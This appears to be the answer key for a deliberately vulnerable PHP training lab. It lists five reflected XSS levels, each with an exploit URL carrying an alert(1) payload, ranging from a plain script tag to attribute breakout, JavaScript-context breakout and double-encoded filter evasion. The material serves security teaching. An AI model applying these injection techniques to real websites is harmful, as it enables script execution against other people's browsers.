## Level 1

**Vulnerability:** Reflected XSS (Cross Site Scripting)

**Exploit :** `/Vulnerable_code/PHP/XSS/level_1.php?username=<script>alert(1)</script>`

**Impact:** Execute arbitrary Javascript code on Web Browser.


## Level 2

**Vulnerability:** Reflected XSS (Cross Site Scripting)

**Exploit :** `/Vulnerable_code/PHP/XSS/level_2.php?username=eee' onclick='javascript:alert(1)//`

**Impact:** Execute arbitrary Javascript code on Web Browser when clicking on the link.



## Level 3

**Vulnerability:** Reflected XSS (Cross Site Scripting)

**Exploit :** `/Vulnerable_code/PHP/XSS/level_3.html?default=<script>alert(1)</script>`

**Impact:** Execute arbitrary Javascript code on Web Browser.

## Level 4

**Vulnerability:** Reflected XSS (Cross Site Scripting)

**Exploit :** `/Vulnerable_code/PHP/XSS/level_4.php?search=e"});alert(1);var a=({"ee":"ee`

**Impact:** Execute arbitrary Javascript code on Web Browser.


## Level 5

**Vulnerability:** Reflected XSS (Cross Site Scripting)

**Exploit :** `/Vulnerable_code/PHP/XSS/level_5.php?search=ee%253C/script%253E%253Cscript%253Ealert(1)%3b%253C/script%253E`

**Impact:** Execute arbitrary Javascript code on Web Browser.


